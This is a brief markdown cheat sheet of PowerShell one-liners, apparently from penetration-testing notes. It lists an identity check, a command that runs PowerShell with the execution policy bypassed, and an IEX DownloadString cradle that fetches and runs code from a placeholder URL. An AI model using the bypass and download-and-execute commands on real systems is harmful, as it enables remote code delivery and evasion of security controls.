# Useful Powershell
- whoami: [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
- powershell.exe -exec bypass -C "ps-command"
- IEX (New-Object Net.WebClient).DownloadString("<url>")